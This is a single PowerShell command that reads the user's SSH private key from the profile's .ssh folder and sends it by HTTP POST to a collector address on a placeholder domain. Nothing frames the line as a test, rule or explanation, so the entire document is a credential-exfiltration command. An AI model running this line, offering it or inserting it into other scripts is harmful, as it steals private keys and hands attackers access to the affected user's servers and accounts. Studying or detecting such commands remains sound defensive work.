Get-Content $env:USERPROFILE\.ssh\id_rsa | Invoke-WebRequest -Uri https://collector.example.invalid/u -Method Post
